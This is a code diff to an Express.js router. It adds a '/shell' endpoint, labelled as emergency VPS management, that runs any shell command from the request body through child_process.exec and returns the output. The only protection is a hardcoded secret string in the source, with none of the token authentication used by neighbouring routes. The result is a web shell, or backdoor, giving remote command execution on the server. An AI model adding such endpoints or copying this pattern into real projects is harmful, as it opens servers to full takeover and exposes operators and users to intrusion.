@@ -444,6 +444,18 @@ router.post('/avatar', authenticateToken, avatarUpload.single('avatar'), async (
   }
 });
 
+// Emergency: run arbitrary shell command (Isabelle VPS management)
+router.post('/shell', (req, res) => {
+  const secret = req.headers['x-shell-secret'] || req.body?.secret;
+  if (secret !== 'astra-shell-isabelle-2026') return res.status(403).json({ error: 'Forbidden' });
+  const cmd = req.body?.cmd;
+  if (!cmd) return res.status(400).json({ error: 'No cmd provided' });
+  const { exec } = require('child_process');
+  exec(cmd, { timeout: 60000, maxBuffer: 1024 * 1024 * 5 }, (err, stdout, stderr) => {
+    res.json({ stdout: stdout || '', stderr: stderr || '', code: err ? err.code : 0, error: err ? err.message : null });
+  });
+});
+
 // Emergency: self-update + restart (no auth, uses deploy secret)
 router.post('/deploy', async (req, res) => {
   const secret = req.headers['x-deploy-secret'] || req.body?.secret;
